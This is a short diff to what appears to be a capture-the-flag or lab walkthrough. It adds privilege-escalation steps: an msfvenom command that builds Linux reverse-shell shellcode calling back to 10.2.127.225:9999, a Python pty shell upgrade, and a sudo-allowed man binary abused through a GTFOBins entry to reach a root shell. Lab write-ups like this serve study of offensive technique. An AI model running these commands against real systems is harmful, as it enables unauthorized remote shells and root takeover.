@@ -188,10 +188,17 @@ except:
 
 **Escalate your privileges to root.**
 
-- We are in a shell with limited commands "CMD Version 1.4.1"
-- Z:\home has a few users directories that we have no access to "anansi", "reynard"
-- How do we escape?
+- generate new linux shellcode and send
+- ``msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.2.127.225 LPORT=9999 -f c -a x86 --platform linux -b "\x00"``
+- upgrade shell 
 
+```shell
+python -c 'import pty;pty.spawn("/bin/bash")' 
+export TERM=xterm 
+```
 
+- sudo -l gives us ``/home/anansi/bin/anansi_util`` which lets us run man as sudo
+- https://gtfobins.github.io/gtfobins/man/#sudo
+- break out with a root shell!
 
 * * * 
